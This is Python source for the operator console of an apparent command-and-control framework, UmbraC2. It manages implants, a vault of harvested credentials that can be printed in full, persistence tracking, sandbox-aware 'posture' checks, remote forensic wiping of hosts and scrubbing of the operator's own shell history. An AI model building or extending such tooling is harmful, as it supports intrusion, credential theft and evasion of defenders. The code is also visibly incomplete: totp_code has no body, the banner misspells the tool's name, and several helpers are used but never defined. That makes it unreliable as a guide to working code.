"""`umbra` -- the UmbraC2 operator console.

Two ways to drive it:

    umbra --server 127.0.0.1:4002 --operator alice agents
    umbra --server 127.0.0.1:4002 --operator alice            # interactive shell

The operator token is read from --token, --token-file or $UMBRA_OPERATOR_TOKEN,
in that order of precedence.  It is the *operator* secret; agents use a
different PSK, so a compromised operator console cannot enrol new implants.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import getpass
import hashlib
import hmac
import json
import os
import shlex
import struct
import sys
import threading
import time
from typing import Any, Dict, List, Optional

from . import __version__, crypto, db, hygiene, image, netio, wire
from .client import CHUNK_MAX, OperatorClient, OperatorError
from .flows import render_bulk_table, render_workflows, run_bulk, run_plan, split_params
from .plan import PlanError, load_plan, plan_params, plan_steps
from .shell import install_readline, read_command, save_history, status_line
from .vpn import (
    _table,
    print_pivots,
    print_vpn_peers,
    print_vpn_routes,
    print_vpn_status,
)

BANNER = r"""
  _   _ __  __ ___  ____      _    ____
 | | | |  \/  | _ \|  _ \    / \  / ___|
 | |_| | |\/| | |_) | |_) |  / _ \| |
 |  _  | |  | |  _ <|  _ <  / ___ \ |___
 |_| |_|_|  |_|_| \_\_| \_\/_/   \_\____|
 umbra/v1 operator console -- authorised lab use only
"""


# ---------------------------------------------------------------------------
# output helpers
# ---------------------------------------------------------------------------
def fmt_ts(value: Any) -> str:
    try:
        ts = int(value)
    except (TypeError, ValueError):
        return str(value)
    if ts <= 0:
        return "-"
    return time.strftime("%Y-%m-%d %H:%M:%SZ", time.gmtime(ts))


def short(text: Any, limit: int = 72) -> str:
    s = str(text if text is not None else "")
    s = s.replace("\r", "").strip()
    if len(s) > limit:
        return s[: limit - 1] + "…"
    return s


def json_default(value: Any) -> Any:
    """Make bytes render as text (or hex if binary) in --json output."""
    if isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            return "hex:" + raw.hex()
    return str(value)


def emit(payload: Any) -> None:
    """One canonical JSON shape: bytes as text, keys sorted.

    It lives at module level so the helpers that wait for a task result can
    print it too, not only the command dispatcher.
    """
    print(json.dumps(payload, indent=2, sort_keys=True, default=json_default))


def decode_out(value: Any) -> str:
    if isinstance(value, (bytes, bytearray)):
        try:
            return bytes(value).decode("utf-8", "replace")
        except Exception:  # pragma: no cover
            return repr(value)
    return str(value if value is not None else "")


def table(headers: List[str], rows: List[List[Any]], widths: Optional[List[int]] = None) -> str:
    if not rows:
        return "(no rows)"
    cols = len(headers)
    widths = widths or [0] * cols
    rendered: List[List[str]] = [[str(c) for c in headers]]
    for row in rows:
        rendered.append([short(c, widths[i]) if widths[i] else str(c) for i, c in enumerate(row)])
    sizes = [max(len(r[i]) for r in rendered) for i in range(cols)]
    out = []
    for idx, row in enumerate(rendered):
        line = "  ".join(cell.ljust(sizes[i]) for i, cell in enumerate(row))
        out.append(line.rstrip())
        if idx == 0:
            out.append("  ".join("-" * sizes[i] for i in range(cols)))
    return "\n".join(out)


def print_agents(agents: List[Dict[str, Any]]) -> None:
    if not agents:
        print("no agents have checked in yet")
        return
    rows = [
        [
            a.get("id", "?"),
            a.get("host", "?"),
            f"{a.get('os', '?')}/{a.get('arch', '?')}",
            a.get("user", "?"),
            a.get("state", "?"),
            a.get("transport", "?"),
            f"{a.get('sleep', '?')}s/{a.get('jitter', '?')}%",
            ",".join(str(t) for t in (a.get("tags") or [])) or "-",
            fmt_ts(a.get("last_seen") if not isinstance(a.get("last_seen"), int) else a.get("last_seen")),
        ]
        for a in agents
    ]
    print(table(["ID", "HOST", "OS", "USER", "STATE", "TRANSPORT", "BEACON", "TAGS", "LAST SEEN"], rows))


def print_postures(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
    """The posture of the fleet.

    The posture is what the implant thinks of the host it runs on: a
    virtual machine, a lab machine, an analyst's sandbox.  An operator
    reads it before the first task of the day, not after it.
    """
    if as_json:
        emit(rows)
        return
    if not rows:
        print("no agent has reported a posture yet")
        return
    print(f"{'AGENT':<24} {'POSTURE':<26} {'CONF':>5}  {'SILENT':>6}  {'KILL':>5}")
    for row in rows:
        print(f"{str(row['agent'])[:24]:<24} {str(row['label'])[:26]:<26} "
              f"{row['confidence']:>5}  {'yes' if row['silent'] else 'no':>6}  "
              f"{'yes' if row['killswitch'] else 'no':>5}")
    sandboxes = len([r for r in rows if r["sandbox"]])
    silent = len([r for r in rows if r["silent"]])
    armed = len([r for r in rows if r["killswitch"]])
    print(f"{len(rows)} hosts, {sandboxes} in a sandbox, {silent} silent, {armed} with a kill switch")


def print_credentials(rows: List[Dict[str, Any]], as_json: bool = False,
                      with_secrets: bool = False) -> None:
    """The vault of the engagement.

    The table is what an operator reads before they ask for the values:
    the kind of the material, the account it belongs to, the host it came
    from and how sure the implant was.  The value itself only appears when
    the operator asked for it.
    """
    if as_json:
        emit(rows)
        return
    if not rows:
        print("the vault is empty")
        return
    print(f"{'AGENT':<20} {'KIND':<10} {'ACCOUNT':<26} {'TARGET':<24} "
          f"{'CONF':>5}  {'SOURCE':<10} {'VALUE':<12}")
    for row in rows:
        if with_secrets:
            # The export is the one place where the value is shown, and it
            # is shown whole: a value an operator cannot copy is not a
            # value they asked for.
            value = str(row.get("secret", "") or "")
        else:
            value = "(redacted)"
        print(f"{str(row.get('agent_id', ''))[:20]:<20} "
              f"{str(row.get('kind', ''))[:10]:<10} "
              f"{str(row.get('account', ''))[:26]:<26} "
              f"{str(row.get('target', ''))[:24]:<24} "
              f"{int(row.get('confidence', 0) or 0):>5}  "
              f"{str(row.get('source', ''))[:10]:<10} {value:<12}")
    kinds: Dict[str, int] = {}
    for row in rows:
        kind = str(row.get("kind", "?"))
        kinds[kind] = kinds.get(kind, 0) + 1
    summary = ", ".join(f"{count} {kind}" for kind, count in sorted(kinds.items()))
    print(f"{len(rows)} records: {summary}")


def print_persistence(rows: List[Dict[str, Any]], as_json: bool = False) -> None:
    """The persistence of the fleet.

    The table is the handover artefact: the hosts that carry an entry, the
    ones whose entry is broken, and the techniques that have to be removed
    when the engagement ends.
    """
    if as_json:
        print(json.dumps(rows, indent=2, default=str))
        return
    if not rows:
        print("no agents have checked in yet")
        return
    table_rows = [
        [
            row.get("agent", "?"),
            row.get("host", "?"),
            str(row.get("entries", 0)),
            str(row.get("broken", 0)),
            row.get("state", "?"),
            ", ".join(row.get("methods") or []) or "-",
        ]
        for row in rows
    ]
    print(table(["AGENT", "HOST", "ENTRIES", "BROKEN", "STATE", "TECHNIQUES"], table_rows))
    covered = sum(1 for row in rows if row.get("state") == "covered")
    broken = sum(1 for row in rows if row.get("state") == "broken")
    print(f"{covered} covered, {broken} broken, {len(rows) - covered - broken} without persistence")


def print_whoami(data: Dict[str, Any]) -> None:
    caps = data.get("capabilities") or []
    print(f"operator : {data.get('name')}")
    print(f"role     : {data.get('role')}")
    print(f"peer     : {data.get('peer')} ({data.get('transport')})")
    print(f"since    : {data.get('since')}")
    if data.get("focus"):
        print(f"focus    : {data['focus']}")
    print(f"commands : {len(caps)} allowed")
    if caps:
        print("           " + " ".join(sorted(caps)))


def print_chat(messages: List[Dict[str, Any]]) -> None:
    if not messages:
        print("no chat messages yet")
        return
    for m in messages:
        role = m.get("role") or "?"
        to = m.get("to") or ""
        # A directed message is marked, because the room sees it in the history:
        # addressing is a label for the team, not a private channel.
        arrow = f" -> {to}" if to else ""
        print(f"[{fmt_ts(m.get('at'))}] {m.get('from')}{arrow} ({role}): {m.get('text')}")


def print_schedules(schedules: List[Dict[str, Any]]) -> None:
    if not schedules:
        print("no recurring tasks")
        return
    rows = [
        [
            sc.get("id", "?"),
            sc.get("agent_id", "?"),
            sc.get("kind", "?"),
            f"{sc.get('every', 0)}s",
            str(sc.get("runs", 0)),
            "on" if sc.get("enabled", True) else "off",
            fmt_ts(sc.get("next_run")),
            sc.get("by", "?"),
        ]
        for sc in schedules
    ]
    print(table(["ID", "AGENT", "KIND", "EVERY", "RUNS", "STATE", "NEXT RUN", "BY"], rows))


def print_operators(operators: List[Dict[str, Any]]) -> None:
    if not operators:
        print("no operator consoles connected")
        return
    rows = [
        [
            o.get("name", "?"),
            o.get("role", "?"),
            o.get("focus") or "-",
            f"{o.get('idle_sec', 0)}s",
            o.get("peer", "?"),
            o.get("transport", "?"),
            str(o.get("backlog", 0)),
        ]
        for o in operators
    ]
    print(table(["OPERATOR", "ROLE", "FOCUS", "IDLE", "PEER", "TRANSPORT", "BACKLOG"], rows))


def print_tasks(tasks: List[Dict[str, Any]]) -> None:
    if not tasks:
        print("no tasks yet")
        return
    rows = []
    for t in tasks:
        rows.append(
            [
                t.get("id", "?"),
                t.get("kind", "?"),
                t.get("state", "?"),
                t.get("claimed_by") or "-",
                t.get("code", "?"),
                # The trace is the identifier that follows the work from
                # the operator to the implant and back.
                short(str(t.get("trace_id", "") or "-"), 12),
                short(decode_out(t.get("out", "")), 60) or "-",
                fmt_ts(t.get("created")),
            ]
        )
    print(table(["TASK", "KIND", "STATE", "CLAIMED BY", "CODE", "TRACE",
                 "OUTPUT", "CREATED"], rows))


def print_alerts(rules: List[Dict[str, Any]]) -> None:
    if not rules:
        print("the server has no alert rules")
        return
    rows = [
        [
            r.get("name", "?"),
            r.get("event", "?"),
            r.get("tag", "-") or "-",
            r.get("agent", "-") or "-",
            r.get("task_kind", "-") or "-",
            f"{r.get('cooldown_s', 0)}s",
        ]
        for r in rules
    ]
    print(table(["NAME", "EVENT", "TAG", "AGENT", "KIND", "COOLDOWN"], rows))


def build_report(client: OperatorClient, agent_id: str, limit: int,
                 state: Optional["db.StateStore"] = None) -> str:
    """Write the report of one agent as a Markdown document.

    The report is what an operator hands over at the end of an engagement:
    what the host was, what was done on it and what was found.  It is built
    from the server's own record, so it is the same for everybody.
    """
    info = client.agent_info(agent_id)
    tasks = client.tasks(agent_id, limit)
    lines: List[str] = []
    lines.append(f"# {agent_id}")
    lines.append("")
    lines.append(f"_written {time.strftime('%Y-%m-%d %H:%M:%S %Z')}_")
    lines.append("")

    lines.append("## The host")
    lines.append("")
    for key in ("os", "arch", "user", "hostname", "transport", "transport_addr",
                "sleep", "jitter", "tags", "first_seen", "last_seen", "state"):
        value = info.get(key)
        if value in (None, "", [], {}):
            continue
        if isinstance(value, (list, tuple)):
            value = ", ".join(str(v) for v in value)
        lines.append(f"- **{key}**: {value}")
    lines.append("")

    lines.append("## The tasks")
    lines.append("")
    if not tasks:
        lines.append("_no task was run on this agent_")
    else:
        lines.append("| when | kind | state | note |")
        lines.append("| --- | --- | --- | --- |")
        for task in tasks[:limit]:
            when = task.get("completed") or task.get("created") or ""
            when = str(when)[:19].replace("T", " ")
            kind = task.get("kind", "")
            state = task.get("state", "")
            err = str(task.get("err", "") or "")
            note = err[:80] if err else ""
            lines.append(f"| {when} | {kind} | {state} | {note} |")
    lines.append("")

    if state is not None:
        try:
            notes = state.notes(agent_id, limit)
        except Exception:  # noqa: BLE001 - the notebook is a convenience
            notes = []
        if notes:
            lines.append("## The notes")
            lines.append("")
            for note in notes:
                when = str(note.get("at", ""))[:19].replace("T", " ")
                lines.append(f"- **{when}** {note.get('text', '')}")
            lines.append("")

    return "\n".join(lines) + "\n"


def build_engagement_report(client: OperatorClient, limit: int,
                             state: Optional["db.StateStore"] = None) -> str:
    """Write the report of the whole engagement as a Markdown document.

    It is the document that goes with the handover: every host that was
    touched, the timeline of what was done to it, what survives a reboot,
    what was taken off it, the material that was found and the notes the
    operator left.
    """
    agents = client.agents()
    lines: List[str] = []
    lines.append("# The engagement")
    lines.append("")
    lines.append(f"_{len(agents)} hosts_")
    lines.append("")

    lines.append("## The hosts")
    lines.append("")
    lines.append("| agent | host | os | user | transport | state | tags |")
    lines.append("| --- | --- | --- | --- | --- | --- | --- |")
    for agent in agents:
        tags = ", ".join(str(t) for t in (agent.get("tags") or []))
        lines.append("| {} | {} | {} | {} | {} | {} | {} |".format(
            agent.get("id", ""), agent.get("host", ""), agent.get("os", ""),
            agent.get("user", ""), agent.get("transport", ""),
            agent.get("state", ""), tags))
    lines.append("")

    lines.append("## The persistence")
    lines.append("")
    persistence: List[Dict[str, Any]] = []
    try:
        persistence = client.persistence_report()
    except Exception:  # noqa: BLE001 - the report is a convenience
        persistence = []
    if not persistence:
        lines.append("_no host reported a persistence entry_")
    else:
        lines.append("| agent | host | persisted | techniques |")
        lines.append("| --- | --- | --- | --- |")
        for row in persistence:
            entries = row.get("entries") or []
            techniques = ", ".join(
                str(entry.get("technique", "")) for entry in entries)
            lines.append("| {} | {} | {} | {} |".format(
                row.get("agent_id", ""), row.get("host", ""),
                "yes" if row.get("persisted") else "no", techniques))
    lines.append("")

    lines.append("## The tasks")
    lines.append("")
    tasks = client.tasks("", limit)
    if not tasks:
        lines.append("_no task was run_")
    else:
        lines.append("| when | agent | kind | state | note |")
        lines.append("| --- | --- | --- | --- | --- |")
        for task in tasks[:limit]:
            when = task.get("completed") or task.get("created") or ""
            when = str(when)[:19].replace("T", " ")
            err = str(task.get("err", "") or "")
            lines.append("| {} | {} | {} | {} | {} |".format(
                when, task.get("agent_id", ""), task.get("kind", ""),
                task.get("state", ""), err[:80]))
    lines.append("")

    lines.append("## The findings")
    lines.append("")
    findings = _report_findings(tasks)
    if not findings:
        lines.append("_the reconnaissance found nothing_")
    else:
        lines.append("| when | agent | severity | finding | detail |")
        lines.append("| --- | --- | --- | --- | --- |")
        for finding in findings:
            lines.append("| {} | {} | {} | {} | {} |".format(
                finding.get("when", ""), finding.get("agent", ""),
                finding.get("severity", ""), finding.get("name", ""),
                finding.get("detail", "")))
    lines.append("")

    lines.append("## The material")
    lines.append("")
    credentials: List[Dict[str, Any]] = []
    try:
        credentials = client.creds_list(limit=limit)
    except Exception:  # noqa: BLE001 - the report is a convenience
        credentials = []
    if not credentials:
        lines.append("_no material was collected_")
    else:
        lines.append("| agent | kind | account | target | source | confidence |")
        lines.append("| --- | --- | --- | --- | --- | --- |")
        for record in credentials:
            lines.append("| {} | {} | {} | {} | {} | {} |".format(
                record.get("agent_id", ""), record.get("kind", ""),
                record.get("account", ""), record.get("target", ""),
                record.get("source", ""), record.get("confidence", "")))
    lines.append("")

    lines.append("## The artefacts")
    lines.append("")
    artefacts: List[Dict[str, Any]] = []
    try:
        artefacts = client.artifact_list()
    except Exception:  # noqa: BLE001 - the report is a convenience
        artefacts = []
    if not artefacts:
        lines.append("_no artefact was kept_")
    else:
        lines.append("| name | size | digest |")
        lines.append("| --- | --- | --- |")
        for entry in artefacts:
            lines.append("| {} | {} | {} |".format(
                entry.get("name", ""), entry.get("size", ""),
                str(entry.get("sha256", ""))[:16]))
    lines.append("")

    lines.append("## The timeline")
    lines.append("")
    events = []
    try:
        events = (client.events(0, limit) or {}).get("events") or []
    except Exception:  # noqa: BLE001 - the report is a convenience
        events = []
    if not events:
        lines.append("_the journal is empty_")
    else:
        lines.append("| when | event | agent | task |")
        lines.append("| --- | --- | --- | --- |")
        for event in events[:limit]:
            when = str(event.get("at", "") or "")[:19].replace("T", " ")
            lines.append("| {} | {} | {} | {} |".format(
                when, event.get("kind", ""), event.get("agent_id", ""),
                event.get("task_id", "")))
    lines.append("")

    lines.append("## The team")
    lines.append("")
    try:
        operators = client.operators()
    except Exception:  # noqa: BLE001 - the report is a convenience
        operators = []
    if not operators:
        lines.append("_the team was alone_")
    else:
        lines.append("| operator | role | focus | idle |")
        lines.append("| --- | --- | --- | --- |")
        for operator in operators:
            lines.append("| {} | {} | {} | {}s |".format(
                operator.get("name", ""), operator.get("role", ""),
                operator.get("focus") or "-", operator.get("idle_sec", 0)))
    lines.append("")

    if state is not None:
        try:
            notes = state.notes("", limit)
        except Exception:  # noqa: BLE001 - the notebook is a convenience
            notes = []
        if notes:
            lines.append("## The notes")
            lines.append("")
            for note in notes:
                when = str(note.get("at", ""))[:19].replace("T", " ")
                lines.append("- **{}** {} ({})".format(
                    when, note.get("body", note.get("text", "")),
                    note.get("agent", "")))
            lines.append("")

    return "\n".join(lines) + "\n"


def _report_findings(tasks: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """The findings the reconnaissance left in the task answers."""
    out: List[Dict[str, Any]] = []
    for task in tasks:
        meta = task.get("meta") or {}
        report = meta.get("recon")
        if not isinstance(report, dict):
            continue
        when = str(task.get("completed") or task.get("created") or "")[:19]
        for finding in report.get("findings") or []:
            if not isinstance(finding, dict):
                continue
            out.append({
                "when": when.replace("T", " "),
                "agent": task.get("agent_id", ""),
                "severity": finding.get("severity", ""),
                "name": finding.get("name", ""),
                "detail": finding.get("detail", ""),
            })
    return out


def run_task_and_wait(client: OperatorClient, console: Console, agent_id: str,
                      kind: str, task_args: Dict[str, Any], wait: bool,
                      timeout: float, as_json: bool,
                      deadline: str = "", task_timeout: int = 0) -> None:
    """Queue a task and, when asked, wait for its result.

    The deadline and the task timeout are the operator's promises: the
    server cancels a task that passed its deadline and fails one that ran
    out of time, so a stale piece of work never reaches a host.
    """
    task_id = client.submit(agent_id, kind, task_args,
                            deadline=deadline, timeout=task_timeout)
    console.note_task(task_id, agent_id, kind, task_args)
    if as_json and not wait:
        emit({"task_id": task_id, "agent": agent_id, "kind": kind})
    else:
        print(f"queued {task_id}")
    if wait:
        result = client.wait_for_result(task_id, timeout=timeout)
        console.note_result(task_id, result)
        emit(result) if as_json else print_task_result(result)


def run_forensics_and_wait(client: OperatorClient, console: Console, agent_id: str,
                           command: str, task_args: Dict[str, Any], wait: bool,
                           timeout: float, as_json: bool) -> None:
    """Queue a forensics command and, when asked, wait for its result.

    The wipe of a host has its own commands on the server, because it
    ends an engagement and the role of the console has to know it: the
    surface of a host is a viewer's work, the removal of the traces is
    an operator's, and the end of the implant belongs to the person who
    owns the engagement.
    """
    if command == "forensics.survey":
        res = client.forensics_survey(agent_id)
    elif command == "forensics.report":
        res = client.forensics_report(agent_id)
    elif command == "forensics.wipe":
        res = client.forensics_wipe(agent_id, task_args.get("what") or [],
                                    bool(task_args.get("dry_run")))
    elif command == "forensics.verify":
        res = client.forensics_verify(agent_id)
    elif command == "forensics.timeline":
        res = client.forensics_timeline(agent_id, str(task_args.get("journal", "")))
    elif command == "forensics.self":
        res = client.forensics_self(agent_id)
    elif command == "forensics.deadman":
        res = client.forensics_deadman(agent_id, int(task_args.get("minutes") or 0))
    else:
        res = client.forensics_decommission(agent_id)
    task_id = str(res.get("task_id", ""))
    kind = str(res.get("kind", command))
    console.note_task(task_id, agent_id, kind, task_args)
    if as_json and not wait:
        emit({"task_id": task_id, "agent": agent_id, "kind": kind})
    else:
        print(f"queued {task_id}")
    if wait:
        result = client.wait_for_result(task_id, timeout=timeout)
        console.note_result(task_id, result)
        emit(result) if as_json else print_task_result(result)


def run_clean(client: Optional[OperatorClient],
              console: Optional[Console], args: Any) -> int:
    """The traces of the engagement on the machine of the operator.

    The notebook of the console and the files of the state directory go
    as a whole, and the lines of the shell history that name the
    engagement are scrubbed: the rest of the file stays, because the
    history of the operator is not a trace of the engagement.
    """
    history_wanted = bool(args.history)
    notebook_wanted = bool(args.notebook)
    if not history_wanted and not notebook_wanted:
        # Both, when the operator says nothing: the end of an
        # engagement is not a moment for half measures.
        history_wanted = True
        notebook_wanted = True
    if not args.dry_run and not args.yes:
        print("this removes the notebook of the console and the lines of the")
        print("shell history that name the engagement.")
        print("the ledger of the server is not touched: it is the record of")
        print("the engagement, not a trace of it.")
        answer = input("type 'clean' to continue: ").strip()
        if answer != "clean":
            print("nothing was changed")
            return 0
    markers = list(hygiene.DEFAULT_MARKERS)
    server = str(getattr(args, "server", "") or "")
    if client is not None:
        server = str(getattr(client, "server", "") or server)
    if server:
        markers.append(server)
    history = hygiene.scrub_history(markers, dry_run=bool(args.dry_run))
    traces = hygiene.remove_traces(
        hygiene.local_traces(getattr(args, "db", "") or ""),
        dry_run=bool(args.dry_run))
    summary = hygiene.summarise(history, traces)
    if getattr(args, "json", False):
        emit({"history": history, "traces": traces, "summary": summary})
    else:
        print(summary)
        for problem in list(history.get("problems") or []) + list(
                traces.get("problems") or []):
            print(f"  could not be touched: {problem}", file=sys.stderr)
    return 0


def run_cleanup(client: OperatorClient, console: Console, args: Any) -> int:
    """The end of an engagement on many hosts.

    The operator asks for the survey of every host that matches the
    filter, wipes the traces of each of them and asks for the
    verification, and the console prints what each one answered: the
    artefacts that were there, what was removed and what is left.

    The flow is deliberately in the console and not in the server: the
    survey of one host must not wait for the wipe of another, and the
    operator has to see the host that did not answer.
    """
    filters = parse_filter(args.filter)
    agents = client.agents(**filters)
    if not agents:
        print("no host matched the filter")
        return 1
    families = [f.strip() for f in args.what.split(",") if f.strip()]
    rows = []
    for agent in agents:
        agent_id = str(agent.get("id", ""))
        if not agent_id:
            continue
        before = cleanup_step(client, console, agent_id, "forensics.survey", {})
        wiped = cleanup_step(client, console, agent_id, "forensics.wipe",
                             {"what": families})
        after = cleanup_step(client, console, agent_id, "forensics.verify", {})
        rows.append([
            agent_id,
            before.get("wipe_artifacts", "-"),
            wiped.get("wipe_removed", "-"),
            wiped.get("wipe_failed", "-"),
            after.get("wipe_left", "-"),
        ])
    table(["agent", "artefacts", "removed", "failed", "left"], rows)
    return 0


def run_hunt(client: OperatorClient, console: Console, args: Any) -> int:
    """The hunt: the catalogue of the indicators, and the sweep.

    The catalogue is shared by the team, so the console lists it and
    searches it; the sweep sends it to the hosts and prints what each
    of them answered.  The hunt never changes a host.
    """
    action = getattr(args, "hunt_cmd", "") or "list"
    if action == "list":
        payload = client.hunt_list(query=args.query, kind=args.kind)
        if args.json:
            emit(payload)
        else:
            print_hunt_indicators(payload)
        return 0
    if action == "add":
        if not args.value:
            print("an indicator needs a value", file=sys.stderr)
            return 2
        payload = client.hunt_add(args.kind, args.value, label=args.label,
                                  note=args.note, source=args.source)
        if args.json:
            emit(payload)
        else:
            print(f"the indicator {payload.get('id', '?')} is in the catalogue: "
                  f"{payload.get('kind', '?')} {payload.get('value', '?')}")
        return 0
    if action == "remove":
        payload = client.hunt_remove(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"the indicator {payload.get('id', args.id)} left the catalogue")
        return 0
    if action == "sweep":
        filters = parse_filter(args.filter)
        roots = [r.strip() for r in args.roots.split(",") if r.strip()]
        payload = client.hunt_sweep(agent_id=args.agent, roots=roots or None,
                                    all_agents=args.all, **filters)
        rows = payload.get("tasks") or []
        if args.json:
            emit(payload)
            return 0
        print(f"the hunt of {payload.get('indicators', 0)} indicators was "
              f"queued on {payload.get('count', 0)} hosts")
        if not args.wait:
            for row in rows:
                print(f"  {row.get('agent_id', '?')}  {row.get('task_id', '?')}"
                      + (f"  {row.get('error')}" if row.get("error") else ""))
            return 0
        results = run_bulk(client, console, "hunt.scan", {}, rows,
                           cap=4, timeout=180.0, wait=True)
        for row in results:
            answer = str(row.get("out", "") or row.get("err", "") or "")
            print(f"  {row.get('agent_id', '?')}  {row.get('state', '?')}")
            for line in answer.splitlines():
                print(f"    {line}")
        return 0
    print(f"unknown hunt command: {action}", file=sys.stderr)
    return 2


def run_case(client: OperatorClient, console: Console, args: Any) -> int:
    """The evidence files of the engagement.

    A case holds the evidence and the chain of custody: the hash of
    every piece of evidence and the hand that took it.  The chain is
    append-only, and the console says so when it does not fit.
    """
    action = getattr(args, "case_cmd", "") or "list"
    if action == "list":
        payload = client.case_list()
        if args.json:
            emit(payload)
        else:
            print_cases(payload)
        return 0
    if action == "show":
        payload = client.case_get(args.id)
        if args.json:
            emit(payload)
        else:
            print_case(payload)
        return 0
    if action == "create":
        payload = client.case_create(args.title, notes=args.notes)
        if args.json:
            emit(payload)
        else:
            print(f"the case {payload.get('id', '?')} is open: {args.title}")
        return 0
    if action == "add":
        if not args.ref:
            print("a piece of evidence needs a reference: where the bytes are",
                  file=sys.stderr)
            return 2
        payload = client.case_add(args.id, args.kind, args.ref,
                                  sha256=args.sha256, agent_id=args.agent,
                                  task_id=args.task, note=args.note)
        if args.json:
            emit(payload)
        else:
            print(f"the evidence {payload.get('id', '?')} is in the case "
                  f"{args.id}: {payload.get('kind', '?')} {payload.get('ref', '?')}")
        return 0
    if action == "close":
        payload = client.case_close(args.id, note=args.note)
        if args.json:
            emit(payload)
        else:
            print(f"the case {payload.get('id', args.id)} is closed; the chain "
                  f"ends at {str(payload.get('head', ''))[:16]}")
        return 0
    print(f"unknown case command: {action}", file=sys.stderr)
    return 2


def run_approval(client: OperatorClient, console: Console, args: Any) -> int:
    """The two-person rule: the requests that wait for a second pair of eyes.

    An operator who asks for an operation cannot decide it: the queue
    refuses that, and the refusal is the point of the rule.  The console
    says so when the server refuses, because the operator has to know
    why the operation did not run.
    """
    action = getattr(args, "approval_cmd", "") or "list"
    if action == "list":
        payload = client.approval_list(state=getattr(args, "state", ""))
        if args.json:
            emit(payload)
        else:
            print_approvals(payload)
        return 0
    if action == "show":
        payload = client.approval_get(args.id)
        if args.json:
            emit(payload)
        else:
            print_approval(payload)
        return 0
    if action == "request":
        if not args.kind:
            print("a request needs the kind of the operation", file=sys.stderr)
            return 2
        payload = client.approval_request(args.kind, agent_id=args.agent,
                                          reason=args.reason)
        if args.json:
            emit(payload)
        else:
            print(f"the request {payload.get('id', '?')} waits for a decision: "
                  f"{payload.get('kind', '?')} on {payload.get('agent_id', '-')}")
        return 0
    if action == "approve":
        payload = client.approval_approve(args.id, note=args.note)
        if args.json:
            emit(payload)
        else:
            print(f"the request {payload.get('id', args.id)} is approved by "
                  f"{payload.get('decided_by', '?')}")
            if payload.get("task_id"):
                print(f"  the operation is queued: {payload.get('task_id')} "
                      f"on {payload.get('agent_id', '-')}")
        return 0
    if action == "deny":
        payload = client.approval_deny(args.id, note=args.note)
        if args.json:
            emit(payload)
        else:
            print(f"the request {payload.get('id', args.id)} is denied by "
                  f"{payload.get('decided_by', '?')}")
        return 0
    print(f"unknown approval command: {action}", file=sys.stderr)
    return 2


def run_canary(client: OperatorClient, console: Console, args: Any) -> int:
    """The tripwires of the engagement.

    A tripwire is a small file with a secret in it, planted on a host
    where nothing of the engagement belongs.  Nobody knows it is there,
    so nobody touches it -- and the operator learns about it when
    somebody else was on the machine.
    """
    action = getattr(args, "canary_cmd", "") or "list"
    if action == "list":
        payload = client.canary_list(agent_id=getattr(args, "agent", ""))
        if args.json:
            emit(payload)
        else:
            print_canaries(payload)
        return 0
    if action == "show":
        payload = client.canary_get(args.id)
        if args.json:
            emit(payload)
        else:
            print_canary(payload)
        return 0
    if action == "plant":
        if not args.agent:
            print("a tripwire needs the host it is planted on", file=sys.stderr)
            return 2
        if not args.label:
            print("a tripwire needs a label: what it is for", file=sys.stderr)
            return 2
        payload = client.canary_plant(args.agent, args.label, note=args.note)
        if args.json:
            emit(payload)
        else:
            print(f"the tripwire {payload.get('id', '?')} is planted on "
                  f"{payload.get('agent_id', args.agent)}: {args.label}")
            if payload.get("task_id"):
                print(f"  the planting is queued: {payload.get('task_id')}")
        return 0
    if action == "check":
        filters = parse_filter(args.filter)
        payload = client.canary_check(agent_id=args.agent, all_hosts=args.all,
                                       **filters)
        rows = payload.get("tasks") or []
        if args.json:
            emit(payload)
            return 0
        print(f"the look was queued on {payload.get('count', 0)} hosts")
        if not args.wait:
            for row in rows:
                print(f"  {row.get('agent_id', '?')}  {row.get('task_id', '?')}"
                      + (f"  {row.get('error')}" if row.get("error") else ""))
            return 0
        results = run_bulk(client, console, "canary.check", {}, rows,
                           cap=4, timeout=180.0, wait=True)
        for row in results:
            answer = str(row.get("out", "") or row.get("err", "") or "")
            print(f"  {row.get('agent_id', '?')}  {row.get('state', '?')}")
            for line in answer.splitlines():
                print(f"    {line}")
        return 0
    if action == "remove":
        payload = client.canary_remove(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"the tripwire {payload.get('id', args.id)} is not watched any "
                  f"more; the file on the host stays where it is")
        return 0
    print(f"unknown canary command: {action}", file=sys.stderr)
    return 2


def run_otp(client: OperatorClient, console: Console, args: Any) -> int:
    """The second factor of the operator.

    The token of an operator is a secret that lives in the
    configuration of the server and in the memory of the console.  The
    second factor is a secret that lives in the phone of the operator
    and never travels: the console sends the six digits of the moment
    and the server checks them before it answers the handshake.
    """
    action = getattr(args, "otp_cmd", "") or "status"
    if action == "status":
        payload = client.operator_otp_status()
        if args.json:
            emit(payload)
        else:
            rows = payload.get("operators") or []
            if not rows:
                print("no operator has a second factor")
                return 0
            print(f"{len(rows)} operators have a second factor")
            for row in rows:
                state = "on" if row.get("enabled") else "off"
                print(f"  {row.get('operator', '?'):<16} {state:<4}"
                      + (f" {row.get('age', '')}" if row.get("age") else "")
                      + (f"  ({row.get('issuer')})" if row.get("issuer") else ""))
        return 0
    if action == "rotate":
        payload = client.operator_otp_rotate(operator=args.operator,
                                             issuer=args.issuer)
        if args.json:
            emit(payload)
        else:
            print(f"a new secret for {payload.get('operator', '?')}; it is "
                  f"shown once and never again")
            print(f"  the secret: {payload.get('secret', '')}")
            print(f"  the address of the phone: {payload.get('uri', '')}")
        return 0
    if action == "remove":
        payload = client.operator_otp_remove(operator=args.operator)
        if args.json:
            emit(payload)
        else:
            print(f"the second factor of {payload.get('operator', '?')} is "
                  f"taken away; the console works with the token alone")
        return 0
    if action == "code":
        # The code of the moment, computed from the secret.  An operator
        # with the secret does not need this: the phone of the
        # authenticator has the code.  A lab does.
        try:
            code = totp_code(args.secret)
        except ValueError as exc:
            print(str(exc), file=sys.stderr)
            return 2
        if args.json:
            emit({"code": code})
        else:
            print(code)
        return 0
    print(f"unknown otp command: {action}", file=sys.stderr)
    return 2


def totp_code(secret: str, when: Optional[float] = None) -> str:
    """The code of the moment, as RFC 6238 says it is.

    The console computes the code only for the lab: the phone of the
    operator computes it for the real thing.  The arithmetic is the
    standard one -- HMAC-SHA1 over the counter of the step, the byte
    that says where the number starts, the number itself -- so the code
    here is the code of the phone.
    """
